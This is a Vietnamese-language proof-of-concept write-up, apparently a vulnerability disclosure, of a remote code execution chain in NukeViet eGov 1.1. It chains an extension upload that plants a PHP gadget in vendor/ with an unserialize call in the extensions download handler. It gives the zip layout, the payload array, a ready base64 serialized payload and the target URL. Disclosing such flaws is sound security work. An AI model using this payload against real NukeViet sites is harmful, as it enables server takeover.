
# NukeViet eGov 1.1 – Unserialize RCE (2-bug chain)

## Bước 1 – Ghim gadget vào `vendor/` qua upload extension

**Chuẩn bị gói `fruit_poc.zip` với cấu trúc:**
```
fruit_poc.zip
├── text
├── config.ini
└── vendor/
    └── true/
        └── punycode/
            └── src/
                └── Fruit.php
```

**`Fruit.php`:**  
<img width="715" height="388" alt="Screenshot 2025-12-15 at 14 44 39" src="https://github.com/user-attachments/assets/82cb82ae-c424-42fe-b96e-b33f77494122" />


**Upload extension:**

1. Đăng nhập vào admin panel.
2. Truy cập:  
   `http://localhost:8080/admin/index.php?language=vi&nv=extensions&op=manage`
3. Upload file `fruit_poc.zip`.
4. NukeViet sẽ tự động giải nén và ghi file `Fruit.php` vào:  
   `vendor/true/punycode/src/Fruit.php`


<img width="948" height="783" alt="Screenshot 2025-12-15 at 15 13 21" src="https://github.com/user-attachments/assets/5c6686d1-cc31-470c-bf8d-fd9333d64dcc" />

---

## Bước 2 – Lợi dụng `unserialize` trong `extensions/download`

**Đoạn code tại** `admin/extensions/download.php`:

<img width="553" height="292" alt="Screenshot 2025-12-15 at 15 25 16" src="https://github.com/user-attachments/assets/c851a53f-057c-40eb-989a-efbf824d94e0" />

**Cơ chế:**

- PHP cấu hình `unserialize_callback_func = spl_autoload_call`
- Khi `unserialize` gặp object `TrueBV\Fruit`, autoloader sẽ tự động load file gadget đã upload ở Bước 1.

**Payload PHP:**
```php
$payload = [
    'id' => 1,
    'tid' => 1,
    'compatible' => ['id' => 1],
    0 => new TrueBV\Fruit(),
];
```

**Chuỗi base64 gửi trong tham số `data`:**
```
YTo0OntzOjI6ImlkIjtpOjE7czozOiJ0aWQiO2k6MTtzOjEwOiJjb21wYXRpYmxlIjthOjE6e3M6MjoiaWQiO2k6MTt9aTowO086MTI6IlRydWVCVlxGcnVpdCI6MDp7fX0=
```

**Request exploit (Admin access):**  
<img width="624" height="515" alt="Screenshot 2025-12-15 at 14 45 20" src="https://github.com/user-attachments/assets/c8e4d5ac-797a-4474-b003-8c06d399e318" />


---

## Bước 3 – Xác nhận RCE

- Gadget ghi kết quả thực thi lệnh `id` vào file:  
  `data/tmp/rce_test.txt`

Sau khi gửi payload, kiểm tra file kết quả:


<img width="1262" height="498" alt="Screenshot 2025-12-15 at 14 45 32" src="https://github.com/user-attachments/assets/267856dc-f5ca-4a5a-a221-d1c455b6e3e7" />


---

## Kết luận

Hai lỗ hổng:

1. Upload extension cho phép ghi file vào thư mục `vendor/`
2. Unserialize object từ dữ liệu người dùng trong `extensions/download`

Kết hợp lại dẫn tới (RCE) 


